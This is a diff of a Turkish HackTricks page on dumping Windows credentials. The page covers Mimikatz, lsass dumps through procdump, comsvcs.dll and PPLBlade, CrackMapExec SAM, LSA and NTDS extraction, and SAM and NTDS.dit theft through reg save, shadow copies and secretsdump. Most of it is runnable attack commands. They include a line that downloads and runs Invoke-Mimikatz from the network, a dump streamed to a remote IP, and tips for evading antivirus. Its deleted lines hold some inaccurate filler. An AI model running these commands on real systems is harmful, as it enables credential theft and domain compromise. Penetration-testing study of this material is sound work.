@@ -2,19 +2,19 @@
 
 <details>
 
-<summary><strong>AWS hacklemeyi sıfırdan kahraman olmak için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong> ile öğrenin!</strong></summary>
+<summary><strong>Sıfırdan kahramana AWS hacking öğrenmek için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 HackTricks'i desteklemenin diğer yolları:
 
-* Şirketinizi HackTricks'te **reklamını görmek isterseniz** veya **HackTricks'i PDF olarak indirmek isterseniz** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
-* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
-* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
-* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
-* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek** paylaşın.
+* **Şirketinizin HackTricks'te reklamını görmek** veya **HackTricks'i PDF olarak indirmek** istiyorsanız [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
+* [**resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
+* Özel [**NFT**](https://opensea.io/collection/the-peass-family) koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'i keşfedin
+* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter**'da bizi takip edin 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **HackTricks** ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına PR göndererek hacking ipuçlarınızı paylaşın.
 
 </details>
 
-## Kimlik Bilgileri Mimikatz
+## Credentials Mimikatz
 ```bash
 #Elevate Privileges to extract the credentials
 privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
@@ -28,41 +28,19 @@ lsadump::sam
 #One liner
 mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
 ```
-**Invoke-Mimikatz**
+**Mimikatz'ın yapabileceği diğer şeyleri** [**bu sayfada**](credentials-mimikatz.md)**bulun**.
 
-Invoke-Mimikatz, a PowerShell script, is a powerful tool that allows you to extract credentials from a Windows system's memory. It can be used to retrieve passwords, hashes, and other sensitive information stored in memory.
-
-To use Invoke-Mimikatz, you need to have administrative privileges on the target system. Once executed, the script will load the Mimikatz library into memory and perform various operations to extract credentials.
-
-Invoke-Mimikatz can be used to perform the following actions:
-
-- **Pass-the-Hash**: This technique allows you to authenticate to a remote system using the NTLM hash of a user's password, instead of the actual password. This can be useful for lateral movement within a network.
-
-- **Pass-the-Ticket**: This technique allows you to authenticate to a remote system using a Kerberos ticket, instead of a password. This can be useful if you have obtained a valid ticket from another user or service.
-
-- **Golden Ticket**: This technique allows you to create a forged Kerberos ticket that grants you full domain administrator privileges. With a golden ticket, you can impersonate any user or service within the domain.
-
-- **Silver Ticket**: This technique allows you to create a forged Kerberos ticket for a specific service. With a silver ticket, you can impersonate a specific service account and access its associated resources.
-
-- **Skeleton Key**: This technique allows you to inject a malicious DLL into the LSASS process, which enables you to bypass authentication and authenticate as any user without knowing their password.
-
-- **Dumper**: This technique allows you to dump credentials from memory, including passwords, hashes, and Kerberos tickets.
-
-- **Pass-the-Cache**: This technique allows you to authenticate to a remote system using cached credentials, instead of a password. This can be useful if you have physical access to a system or have obtained a copy of the SAM database.
-
-- **DCSync**: This technique allows you to impersonate a domain controller and request password hashes for all domain users. This can be useful for obtaining the NTLM hashes of all domain users without being detected.
-
-Invoke-Mimikatz is a powerful tool that can be used for both legitimate purposes, such as penetration testing, and malicious activities, such as stealing credentials. It is important to use this tool responsibly and with proper authorization.
+### Invoke-Mimikatz
 ```bash
 IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
 Invoke-Mimikatz -DumpCreds #Dump creds from memory
 Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
 ```
-[**Burada bazı olası kimlik bilgileri korumaları hakkında bilgi edinin.**](credentials-protections.md) **Bu korumalar, Mimikatz'ın bazı kimlik bilgilerini çıkarmasını engelleyebilir.**
+[**Bazı olası kimlik bilgisi korumaları hakkında buradan bilgi edinin.**](credentials-protections.md) **Bu korumalar Mimikatz'in bazı kimlik bilgilerini çıkarmasını engelleyebilir.**
 
 ## Meterpreter ile Kimlik Bilgileri
 
-Kurbanın içindeki şifreleri ve karma değerlerini aramak için oluşturduğum [**Kimlik Bilgileri Eklentisini**](https://github.com/carlospolop/MSF-Credentials) kullanın.
+Kurbanın içinde **parola ve hash aramak** için oluşturduğum [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **kullanın.**
 ```bash
 #Credentials from SAM
 post/windows/gather/smart_hashdump
@@ -79,14 +57,14 @@ mimikatz_command -f "sekurlsa::logonpasswords"
 mimikatz_command -f "lsadump::lsa /inject"
 mimikatz_command -f "lsadump::sam"
 ```
-## AV'yi Atlatma
+## AV Atlama
 
 ### Procdump + Mimikatz
 
-**SysInternals'ten** [**Procdump**](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**, meşru bir Microsoft aracı** olduğu için Defender tarafından tespit edilmez.\
-Bu aracı kullanarak **lsass işlemini dump** edebilir, **damp'ı indirebilir** ve **damp'tan yerel olarak** kimlik bilgilerini **çıkarabilirsiniz**.
+**SysInternals'dan Procdump** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**meşru bir Microsoft aracıdır**, bu yüzden Defender tarafından tespit edilmez.\
+Bu aracı kullanarak **lsass sürecini dökebilir**, **dökümü indirebilir** ve **dökümden yerel olarak kimlik bilgilerini çıkarabilirsiniz**.
 
-{% code title="Lsass'ı Dump Et" %}
+{% code title="Dump lsass" %}
 ```bash
 #Local
 C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
@@ -94,7 +72,9 @@ C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
 net use Z: https://live.sysinternals.com
 Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
 ```
-{% code title="Dökümden kimlik bilgilerini çıkarın" %}
+{% endcode %}
+
+{% code title="Extract credentials from the dump" %}
 ```c
 //Load the dump
 mimikatz # sekurlsa::minidump lsass.dmp
@@ -103,181 +83,110 @@ mimikatz # sekurlsa::logonPasswords
 ```
 {% endcode %}
 
-Bu işlem [SprayKatz](https://github.com/aas-n/spraykatz) ile otomatik olarak gerçekleştirilir: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`
+Bu işlem [SprayKatz](https://github.com/aas-n/spraykatz) ile otomatik olarak yapılır: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`
 
-**Not**: Bazı **AV**'ler, **lsass.exe'yi dump etmek için procdump.exe** kullanımını **zararlı** olarak algılayabilir. Bu, **"procdump.exe" ve "lsass.exe"** dizesini algıladıkları içindir. Bu nedenle, procdump'a lsass.exe'nin **adı yerine PID'sini** argüman olarak **geçmek** daha **gizli** bir yöntemdir.
+**Not**: Bazı **AV**'ler **procdump.exe ile lsass.exe'yi dump etme** işlemini **kötü amaçlı** olarak **tespit edebilir**, bunun nedeni **"procdump.exe" ve "lsass.exe"** dizelerini **tespit etmeleridir**. Bu yüzden, procdump'a lsass.exe'nin **PID**'sini **isim yerine** **argüman** olarak **geçmek** daha **gizli** olur.
 
-### **comsvcs.dll** ile lsass'in dump edilmesi
+### **comsvcs.dll** ile lsass dump etme
 
-`C:\Windows\System32` dizininde bulunan **comsvcs.dll** adlı bir DLL, bir çökme durumunda **işlem belleğini dump etmekten** sorumludur. Bu DLL, `rundll32.exe` kullanılarak çağrılan **`MiniDumpW`** adlı bir işlev içerir.\
-İlk iki argümanın kullanılması önemsizdir, ancak üçüncü argüman üç bileşene ayrılır. Dump edilecek işlem ID'si ilk bileşeni oluşturur, dump dosyasının konumu ikinciyi temsil eder ve üçüncü bileşen sadece **full** kelimesidir. Başka seçenekler yoktur.\
-Bu üç bileşenin ayrıştırılmasıyla, DLL dump dosyasını oluşturur ve belirtilen işlemin belleğini bu dosyaya aktarır.\
-**comsvcs.dll**'nin kullanımı, lsass işlemini dump etmek için procdump'ı yüklemek ve çalıştırmak gereksinimini ortadan kaldırır. Bu yöntem ayrıntılı olarak [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords) adresinde açıklanmıştır.
+`C:\Windows\System32`'de bulunan **comsvcs.dll** adlı bir DLL, bir çökme durumunda **işlem belleğini dump etmekten** sorumludur. Bu DLL, `rundll32.exe` kullanılarak çağrılmak üzere tasarlanmış **`MiniDumpW`** adlı bir **fonksiyon** içerir.\
+İlk iki argümanı kullanmak önemsizdir, ancak üçüncü argüman üç bileşene ayrılır. Dump edilecek işlem kimliği ilk bileşeni oluşturur, dump dosyasının konumu ikinci bileşeni temsil eder ve üçüncü bileşen kesinlikle **full** kelimesidir. Başka seçenek yoktur.\
+Bu üç bileşen çözüldüğünde, DLL dump dosyasını oluşturmak ve belirtilen işlemin belleğini bu dosyaya aktarmak için devreye girer.\
+**comsvcs.dll**'nin kullanımı, procdump'ı yükleyip çalıştırmaya gerek kalmadan lsass işlemini dump etmek için uygundur. Bu yöntem, [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords) adresinde ayrıntılı olarak açıklanmıştır.
 
 Aşağıdaki komut yürütme için kullanılır:
 ```bash
 rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
 ```
-**Bu işlemi** [**lssasy**](https://github.com/Hackndo/lsassy)** ile otomatikleştirebilirsiniz.**
+**Bu süreci** [**lssasy**](https://github.com/Hackndo/lsassy)** ile otomatikleştirebilirsiniz.**
 
-### **Task Yöneticisi ile lsass'in Dump Edilmesi**
+### **Task Manager ile lsass dökümü alma**
 
-1. Görev Çubuğuna sağ tıklayın ve Task Yöneticisi'ni seçin.
-2. Daha fazla ayrıntıyı göster'i tıklayın.
-3. İşlemler sekmesinde "Local Security Authority Process" işlemini arayın.
-4. "Local Security Authority Process" işlemine sağ tıklayın ve "Dump dosyası oluştur" seçeneğini tıklayın.
+1. Görev Çubuğuna sağ tıklayın ve Görev Yöneticisi'ne tıklayın
+2. Daha fazla ayrıntıya tıklayın
+3. İşlemler sekmesinde "Local Security Authority Process" işlemini arayın
+4. "Local Security Authority Process" işlemine sağ tıklayın ve "Döküm dosyası oluştur" seçeneğine tıklayın.
 
-### procdump ile lsass'in Dump Edilmesi
+### procdump ile lsass dökümü alma
 
-[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump), [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) paketinin bir parçası olan Microsoft tarafından imzalanmış bir ikili dosyadır.
+[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump), [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) paketinin bir parçası olan Microsoft imzalı bir ikilidir.
 ```
 Get-Process -Name LSASS
 .\procdump.exe -ma 608 lsass.dmp
 ```
-## PPLBlade ile lsass'in Dump Edilmesi
+## PPLBlade ile lsass Dump Etme
 
-[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade), bellek dökümünü obfuskasyon yaparak ve diske kaydetmeden uzak çalışma istasyonlarına aktarabilen Korunan Süreç Dökücü Aracıdır.
+[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade), bellek dökümünü gizleyerek ve diske kaydetmeden uzaktaki iş istasyonlarına aktararak korunan bir işlem döküm aracıdır.
 
 **Ana işlevler**:
 
 1. PPL korumasını atlatma
-2. Bellek döküm dosyalarını Defender imza tabanlı tespit mekanizmalarından kaçınmak için obfuskasyon yapma
-3. Bellek dökümünün RAW ve SMB yükleme yöntemleriyle diske kaydetmeden yükleme yapma (dosyasız döküm)
+2. Defender imza tabanlı tespit mekanizmalarından kaçınmak için bellek döküm dosyalarını gizleme
+3. Bellek dökümünü diske kaydetmeden RAW ve SMB yükleme yöntemleriyle yükleme (filesiz dump)
 
 {% code overflow="wrap" %}
 ```bash
 PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
 ```
-{% code %}
+{% endcode %}
 
 ## CrackMapExec
 
-### SAM hashları çalma
+### Dump SAM hashes
+
+SAM hash'lerini dök.
 ```
 cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
 ```
-### LSA sırlarını çalma
-
-Bu teknik, Windows işletim sistemlerindeki LSA (Local Security Authority) sırlarını çalmak için kullanılır. LSA sırları, kullanıcı kimlik bilgileri, oturum açma parolaları ve diğer hassas bilgileri içeren önemli verileri depolar.
-
-Bu teknik, `lsadump` aracı kullanılarak gerçekleştirilir. Bu araç, LSA sırlarını çalmak için çeşitli yöntemler kullanır. Bu yöntemler arasında `lsass` bellek bölgesini okuma, `Security Account Manager (SAM)` veritabanını çözme ve `Registry` anahtarlarını analiz etme bulunur.
-
-Bu teknik, bir saldırganın hedef sisteme erişimi olduğunda kullanılabilir. Saldırgan, LSA sırlarını çalarak kullanıcı kimlik bilgilerine erişebilir ve bu bilgileri kötüye kullanabilir.
-
-Bu teknik, bir sistemdeki güvenlik açıklarını tespit etmek ve düzeltmek için kullanılabilir. Sistem yöneticileri, LSA sırlarını korumak için gerekli önlemleri almalı ve güvenlik açıklarını kapatmalıdır.
+### LSA sırlarını Dump etme
 ```
 cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
 ```
-### Hedef DC'den NTDS.dit'i dökün
-
-```plaintext
-To dump the NTDS.dit file from a target Domain Controller (DC), you can use various methods. Here are a few techniques:
-
-1. **NTDSUtil**: This built-in Windows utility allows you to interact with the Active Directory (AD) database. You can use the following commands to dump the NTDS.dit file:
-   ```plaintext
-   ntdsutil
-   activate instance ntds
-   ifm
-   create full <path_to_dump_folder>
-   quit
-   ```
-
-2. **Mimikatz**: This powerful post-exploitation tool can be used to extract credentials from memory. To dump the NTDS.dit file using Mimikatz, follow these steps:
-   ```plaintext
-   mimikatz
-   privilege::debug
-   lsadump::lsa /inject /name:ntds
-   ```
-
-3. **PowerShell**: You can also use PowerShell to dump the NTDS.dit file. Here's an example script:
-   ```plaintext
-   $NTDSPath = "C:\Windows\NTDS\NTDS.dit"
-   $DestinationPath = "C:\Temp\NTDS.dit"
-   Copy-Item -Path $NTDSPath -Destination $DestinationPath
-   ```
-
-Remember that dumping the NTDS.dit file requires administrative privileges on the target DC. Additionally, be cautious when handling sensitive data and ensure that you have the necessary permissions to perform these actions.
-```
+### Hedef DC'den NTDS.dit'i Dump Etme
 ```
 cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
 #~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
 ```
-### Hedef DC'den NTDS.dit parola geçmişini dökün
-
-```plaintext
-**Description**: This technique allows you to dump the password history stored in the NTDS.dit file on a target Domain Controller (DC). The NTDS.dit file is a database file that stores Active Directory data, including user account information and password hashes.
-
-**Method**: To dump the password history from the NTDS.dit file, you can use tools like `mimikatz` or `secretsdump.py`. These tools can extract the password hashes and other relevant information from the NTDS.dit file.
-
-**Steps**:
-1. Obtain administrative access to a machine on the target network.
-2. Download and run `mimikatz` or `secretsdump.py` on the machine.
-3. Use the appropriate command to dump the password history from the NTDS.dit file. For example, in `mimikatz`, you can use the `lsadump::sam` command.
-4. Save the dumped password hashes and analyze them to identify any weak or compromised passwords.
-
-**Note**: Dumping the password history from the NTDS.dit file can be useful for password cracking or auditing purposes. However, it is important to ensure that you have proper authorization and legal permission before performing any hacking activities.
-```
-
-```plaintext
-**Açıklama**: Bu teknik, hedef bir Etki Alanı Denetleyicisi'ndeki (DC) NTDS.dit dosyasında depolanan parola geçmişini dökmek için kullanılır. NTDS.dit dosyası, Kullanıcı hesap bilgileri ve parola karma değerleri de dahil olmak üzere Active Directory verilerini depolayan bir veritabanı dosyasıdır.
-
-**Yöntem**: NTDS.dit dosyasından parola geçmişini dökmek için `mimikatz` veya `secretsdump.py` gibi araçları kullanabilirsiniz. Bu araçlar, NTDS.dit dosyasından parola karma değerlerini ve diğer ilgili bilgileri çıkarabilir.
-
-**Adımlar**:
-1. Hedef ağdaki bir makineye yönetici erişimi elde edin.
-2. Makineye `mimikatz` veya `secretsdump.py` indirin ve çalıştırın.
-3. NTDS.dit dosyasından parola geçmişini dökmek için uygun komutu kullanın. Örneğin, `mimikatz` kullanıyorsanız `lsadump::sam` komutunu kullanabilirsiniz.
-4. Dökülen parola karma değerlerini kaydedin ve zayıf veya tehlikede olan parolaları belirlemek için analiz edin.
-
-**Not**: NTDS.dit dosyasından parola geçmişini dökmek, parola kırma veya denetim amacıyla faydalı olabilir. Ancak, herhangi bir hackleme faaliyeti gerçekleştirmeden önce uygun yetkilendirme ve yasal izinlere sahip olduğunuzdan emin olmanız önemlidir.
-```
+### Hedef DC'den NTDS.dit parola geçmişini dökme
 ```
 #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
 ```
-### Her bir NTDS.dit hesabı için pwdLastSet özniteliğini gösterin
+### Her NTDS.dit hesabı için pwdLastSet özniteliğini göster
 
-NTDS.dit hesapları için pwdLastSet özniteliğini göstermek için aşağıdaki adımları izleyin:
-
-1. Bir komut istemcisini açın.
-2. `ntdsutil` komutunu çalıştırın.
-3. `activate instance ntds` komutunu çalıştırın.
-4. `ifm` komutunu çalıştırın.
-5. `create full C:\path\to\output` komutunu çalıştırın. (Çıktıyı istediğiniz bir yola değiştirin)
-6. `quit` komutunu çalıştırın.
-7. `quit` komutunu tekrar çalıştırın.
-
-Bu adımları takip ettikten sonra, NTDS.dit hesaplarının pwdLastSet özniteliğini içeren bir çıktı dosyası oluşturulacaktır.
+```shell
+dsquery * -filter "(&(objectCategory=person)(objectClass=user))" -attr samAccountName pwdLastSet
+```
 ```
 #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
 ```
-## SAM ve SYSTEM Çalmak
+## SAM & SYSTEM Çalma
 
-Bu dosyaların konumu _C:\windows\system32\config\SAM_ ve _C:\windows\system32\config\SYSTEM_ olmalıdır. Ancak bunları korundukları için sıradan bir şekilde kopyalayamazsınız.
+Bu dosyalar _C:\windows\system32\config\SAM_ ve _C:\windows\system32\config\SYSTEM_ konumunda **bulunmalıdır.** Ancak **bu dosyaları normal bir şekilde kopyalayamazsınız** çünkü korunmaktadırlar.
 
-### Kayıttan
+### Kayıt Defterinden
 
-Bu dosyaları çalmak için en kolay yol, kayıttan bir kopya almak:
+Bu dosyaları çalmanın en kolay yolu, kayıt defterinden bir kopya almaktır:
 ```
 reg save HKLM\sam sam
 reg save HKLM\system system
 reg save HKLM\security security
 ```
-**Kali** makinenize bu dosyaları **indirin** ve **hash'leri çıkarın** kullanarak:
+**Download** dosyaları Kali makinenize ve **hash'leri çıkarın** kullanarak:
 ```
 samdump2 SYSTEM SAM
 impacket-secretsdump -sam sam -security security -system system LOCAL
 ```
 ### Volume Shadow Copy
 
-Bu hizmeti kullanarak korumalı dosyaların bir kopyasını alabilirsiniz. Yönetici olmanız gerekmektedir.
+Bu hizmeti kullanarak korunan dosyaların kopyasını alabilirsiniz. Yönetici olmanız gerekmektedir.
 
-#### vssadmin Kullanımı
+#### vssadmin Kullanarak
 
-vssadmin ikili dosyası yalnızca Windows Server sürümlerinde mevcuttur.
+vssadmin binary sadece Windows Server sürümlerinde mevcuttur.
 ```bash
 vssadmin create shadow /for=C:
 #Copy SAM
-copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SAM
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
 #Copy SYSTEM
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
 #Copy ntds.dit
@@ -286,7 +195,7 @@ copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Ex
 # You can also create a symlink to the shadow copy and access it
 mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
 ```
-Ancak aynısını **Powershell** ile yapabilirsiniz. Bu, **SAM dosyasını nasıl kopyalayacağınızın bir örneğidir** (kullanılan sabit disk "C:" ve C:\users\Public'e kaydedilir), ancak bu korumalı herhangi bir dosyayı kopyalamak için kullanabilirsiniz:
+Ancak aynı şeyi **Powershell** ile de yapabilirsiniz. Bu, **SAM dosyasını kopyalamanın** bir örneğidir (kullanılan sabit disk "C:" ve C:\users\Public'e kaydedilmiştir) ancak bu yöntemi korunan herhangi bir dosyayı kopyalamak için kullanabilirsiniz:
 ```bash
 $service=(Get-Service -name VSS)
 if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
@@ -295,71 +204,69 @@ $volume=(gwmi win32_shadowcopy -filter "ID='$id'")
 cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
 $voume.Delete();if($notrunning -eq 1){$service.Stop()}
 ```
-Kod kitaptan: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
-
 ### Invoke-NinjaCopy
 
-Son olarak, [**PS betiği Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) kullanarak SAM, SYSTEM ve ntds.dit'in bir kopyasını oluşturabilirsiniz.
+Son olarak, SAM, SYSTEM ve ntds.dit dosyalarının bir kopyasını oluşturmak için [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) kullanabilirsiniz.
 ```bash
 Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
 ```
-## **Active Directory Kimlik Bilgileri - NTDS.dit**
+## **Active Directory Credentials - NTDS.dit**
 
-**NTDS.dit** dosyası, kullanıcı nesneleri, gruplar ve üyelikleri hakkında önemli verileri içeren **Active Directory**'nin kalbi olarak bilinir. Alan kullanıcılarının **şifre karmaları** burada depolanır. Bu dosya, bir **Genişletilebilir Depolama Motoru (ESE)** veritabanıdır ve **_%SystemRoom%/NTDS/ntds.dit_** konumunda bulunur.
+**NTDS.dit** dosyası, **Active Directory**'nin kalbi olarak bilinir ve kullanıcı nesneleri, gruplar ve üyelikleri hakkında kritik verileri tutar. Bu dosya, etki alanı kullanıcılarının **parola hash'lerini** saklar. Bu dosya, bir **Extensible Storage Engine (ESE)** veritabanıdır ve **_%SystemRoom%/NTDS/ntds.dit_** konumunda bulunur.
 
-Bu veritabanında üç temel tablo bulunur:
+Bu veritabanında üç ana tablo bulunur:
 
-- **Veri Tablosu**: Bu tablo, kullanıcılar ve gruplar gibi nesneler hakkında ayrıntıları depolamakla görevlidir.
-- **Bağlantı Tablosu**: Grup üyelikleri gibi ilişkileri takip eder.
-- **SD Tablosu**: Depolanan nesnelerin güvenliğini ve erişim kontrolünü sağlayan her nesne için güvenlik tanımlayıcıları burada bulunur.
+- **Data Table**: Bu tablo, kullanıcılar ve gruplar gibi nesneler hakkında ayrıntıları saklamakla görevlidir.
+- **Link Table**: Grup üyelikleri gibi ilişkileri takip eder.
+- **SD Table**: Her nesne için **güvenlik tanımlayıcıları** burada tutulur, saklanan nesnelerin güvenliğini ve erişim kontrolünü sağlar.
 
-Daha fazla bilgi için: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)
+Bu konuda daha fazla bilgi: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)
 
-Windows, _Ntdsa.dll_ kullanarak bu dosya ile etkileşimde bulunur ve _lsass.exe_ tarafından kullanılır. Ardından, **NTDS.dit** dosyasının bir **bölümü**, **`lsass`** belleği içinde bulunabilir (performans artışı için bir **önbellek** kullanıldığı için muhtemelen en son erişilen verileri bulabilirsiniz).
+Windows, bu dosya ile etkileşim kurmak için _Ntdsa.dll_ kullanır ve bu dosya _lsass.exe_ tarafından kullanılır. Bu nedenle, **NTDS.dit** dosyasının **bir kısmı** **`lsass`** belleğinde bulunabilir (muhtemelen performans iyileştirmesi için bir **önbellek** kullanılarak en son erişilen verileri bulabilirsiniz).
 
-#### NTDS.dit içindeki karmaşaların şifrelenmesi
+#### NTDS.dit içindeki hash'leri deşifre etme
 
-Karma 3 kez şifrelenir:
+Hash 3 kez şifrelenmiştir:
 
-1. **BOOTKEY** ve **RC4** kullanarak **Şifre Şifreleme Anahtarı (PEK)** şifresini çözme.
-2. **PEK** ve **RC4** kullanarak **karma**yı şifre çözme.
-3. **DES** kullanarak **karma**yı şifre çözme.
+1. Parola Şifreleme Anahtarını (**PEK**) **BOOTKEY** ve **RC4** kullanarak deşifre edin.
+2. **Hash'i** **PEK** ve **RC4** kullanarak deşifre edin.
+3. **Hash'i** **DES** kullanarak deşifre edin.
 
-**PEK**, **her etki alanı denetleyicisinde aynı değere** sahiptir, ancak **NTDS.dit** dosyasında **etki alanı denetleyicisinin SYSTEM dosyasının BOOTKEY**'i kullanılarak **şifrelenir**. Bu nedenle, NTDS.dit dosyasından kimlik bilgilerini almak için **NTDS.dit ve SYSTEM** dosyalarına ihtiyacınız vardır (_C:\Windows\System32\config\SYSTEM_).
+**PEK**, **her etki alanı denetleyicisinde** **aynı değere** sahiptir, ancak **NTDS.dit** dosyası içinde **etki alanı denetleyicisinin SYSTEM dosyasının BOOTKEY'i (etki alanı denetleyicileri arasında farklıdır)** kullanılarak şifrelenmiştir. Bu nedenle, NTDS.dit dosyasından kimlik bilgilerini almak için **NTDS.dit ve SYSTEM dosyalarına** (_C:\Windows\System32\config\SYSTEM_) ihtiyacınız vardır.
 
-### Ntdsutil kullanarak NTDS.dit Kopyalama
+### Ntdsutil kullanarak NTDS.dit kopyalama
 
-Windows Server 2008'den bu yana kullanılabilir.
+Windows Server 2008'den beri kullanılabilir.
 ```bash
 ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
 ```
-[**Volume shadow copy**](./#stealing-sam-and-system) hilesini kullanarak **ntds.dit** dosyasını kopyalamak da mümkündür. Unutmayın ki **SYSTEM dosyasının** bir kopyasına da ihtiyacınız olacak (yine, [**kayıttan dökün veya volume shadow copy**](./#stealing-sam-and-system) hilesini kullanın).
+[**Volume shadow copy**](./#stealing-sam-and-system) hilesini kullanarak **ntds.dit** dosyasını da kopyalayabilirsiniz. Ayrıca **SYSTEM file**'ın bir kopyasına da ihtiyacınız olacağını unutmayın (yine, [**registry'den dump edin veya volume shadow copy**](./#stealing-sam-and-system) hilesini kullanın).
 
-### **NTDS.dit'ten hash çıkarma**
+### **NTDS.dit dosyasından hash çıkarma**
 
-**NTDS.dit** ve **SYSTEM** dosyalarını **edinledikten** sonra, _secretsdump.py_ gibi araçları kullanarak **hash'leri çıkarabilirsiniz**:
+**NTDS.dit** ve **SYSTEM** dosyalarını **elde ettikten** sonra, _secretsdump.py_ gibi araçları kullanarak **hash'leri çıkarabilirsiniz**:
 ```bash
 secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
 ```
-Ayrıca, geçerli bir etki alanı yönetici kullanarak onları otomatik olarak **çıkarabilirsiniz**:
+Ayrıca geçerli bir domain admin kullanıcısı kullanarak **otomatik olarak çıkarabilirsiniz**:
 ```
 secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
 ```
-**Büyük NTDS.dit dosyaları** için, [gosecretsdump](https://github.com/c-sto/gosecretsdump) kullanarak çıkarmak önerilir.
+**Büyük NTDS.dit dosyaları** için, [gosecretsdump](https://github.com/c-sto/gosecretsdump) kullanarak çıkartılması tavsiye edilir.
 
-Son olarak, **metasploit modülü** olan _post/windows/gather/credentials/domain\_hashdump_ veya **mimikatz** `lsadump::lsa /inject` kullanabilirsiniz.
+Son olarak, **metasploit modülü**: _post/windows/gather/credentials/domain\_hashdump_ veya **mimikatz** `lsadump::lsa /inject` kullanabilirsiniz.
 
-### **NTDS.dit'ten domain nesnelerini bir SQLite veritabanına çıkarma**
+### **NTDS.dit dosyasından SQLite veritabanına etki alanı nesnelerini çıkartma**
 
